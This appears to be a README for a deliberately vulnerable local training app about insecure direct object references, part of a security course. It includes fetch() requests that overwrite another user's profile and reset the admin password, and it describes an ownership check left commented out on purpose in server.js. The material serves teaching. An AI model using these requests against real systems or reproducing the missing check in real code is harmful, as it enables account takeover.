# 🔑 idor-profiles — IDOR Demo

> A tiny profile site with real signup/login. Create two accounts, intercept your own save request, then use **DevTools → Network → Copy as fetch** to edit another user's profile — and chain it to take over the admin.

**Maps to:** [Day 3 → IDOR](../../Day-3.md#-topic-1-idor-insecure-direct-object-reference--easy)

---

## ▶️ How to Run

You need **Node.js** (v18+).

```bash
cd demos/idor-profiles
npm install
node server.js
```

Open [http://localhost:3001](http://localhost:3001).

### What's seeded

Only the **admin** account is pre-seeded at **id 1**. Everything else you create via the signup form.

**User IDs auto-increment starting at 46**, so:
- First signup → id **46**
- Second signup → id **47**
- Third signup → id **48**

That gap between your IDs (46+) and the admin (1) is what makes the escalation feel real.

---

## 🎬 Attack Flow

### Phase 1 — Normal signup

1. Open http://localhost:3001 → click **Sign up**
2. Create `alice` / `alice123` (add a bio). You land on `/profile` as id **46**.
3. Edit bio, save. Works normally.
4. Log out → sign up again as `bob` / `bob123`. You're now id **47**.
5. Edit bob's bio, save.

### Phase 2 — Find the vulnerable request

Logged in as **bob**:

1. Open **DevTools → Network tab**.
2. Edit bob's bio to `hello from bob` → click **Save changes**.
3. Find the request in Network:

   ```
   PATCH /api/users/47
   ```

4. Look at the payload:

   ```json
   { "bio": "hello from bob", "email": "bob@x.com" }
   ```

The only thing proving bob is allowed to edit user 47 is the session cookie. The URL `/users/47` is blindly trusted — no ownership check.

### Phase 3 — Copy as fetch → attack alice

1. In Network, right-click the PATCH request → **Copy → Copy as fetch**.
2. Switch to **Console** and paste. You'll get something like:

   ```js
   fetch("http://localhost:3001/api/users/47", {
     "method": "PATCH",
     "headers": { "content-type": "application/json" },
     "body": "{\"bio\":\"hello from bob\",\"email\":\"bob@x.com\"}",
     "credentials": "include"
   });
   ```

3. Change two things:
   - `47` → `46` (alice's ID)
   - body bio → `"PWNED by bob"`

   ```js
   fetch("http://localhost:3001/api/users/46", {
     "method": "PATCH",
     "headers": { "content-type": "application/json" },
     "body": "{\"bio\":\"PWNED by bob\"}",
     "credentials": "include"
   }).then(r => r.json()).then(console.log);
   ```

4. Console prints:

   ```
   { ok: true, id: 46, username: "alice", bio: "PWNED by bob", ... }
   ```

   Bob just rewrote alice's data. **That's IDOR confirmed.**

5. Optional proof: log out → log in as alice → her profile shows "PWNED by bob".

### Phase 4 — Escalate to admin 🎯

If regular user IDs go `46, 47, 48…`, who's id **1**?

> Developers almost always give the first account to the admin. Not a rule, but a convention that holds often enough to try.

Back to Console, still as bob:

```js
fetch("http://localhost:3001/api/users/1", {
  "method": "PATCH",
  "headers": { "content-type": "application/json" },
  "body": "{\"password\":\"pwned123\"}",
  "credentials": "include"
}).then(r => r.json()).then(console.log);
```

Console prints:

```
{ ok: true, id: 1, username: "admin", ... }
```

Log out. Log in as `admin` / `pwned123`. **Welcome, admin.** 💀

---

## 🧠 Key Takeaways

1. **The request looks 100% legitimate.** No quotes, no `<script>`, no weird payload — just a PATCH with a JSON body. That's why IDOR is invisible to automated scanners.
2. **The URL never appears in the address bar.** IDOR isn't just URL-bar hacking — it's about **any** ID in **any** request.
3. **The "id 1 is admin" heuristic.** IDs `1`, `1000`, or the first email alphabetically are disproportionately likely to be privileged. Try them early.
4. **The fix is one line.** In [`server.js`](./server.js), the PATCH handler has a commented-out ownership check:

   ```js
   // if (id !== req.currentUserId) return res.status(403).json({ error: 'Forbidden' });
   ```

   Uncomment it, restart, re-run the attack → **403 Forbidden**.

---

## 🛠️ Resetting

The database is in-memory. Restart the server (`Ctrl+C` → `node server.js`) to wipe all signups. Only the admin remains.

---

## 🔗 Next

- [PortSwigger's IDOR lab](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references) — same idea, remote lab
- [User ID in request parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter) — a variant
- [IDOR Cheat Sheet](../../CHEATSHEET.md#-idor-insecure-direct-object-reference)

[← Back to demos index](../README.md)
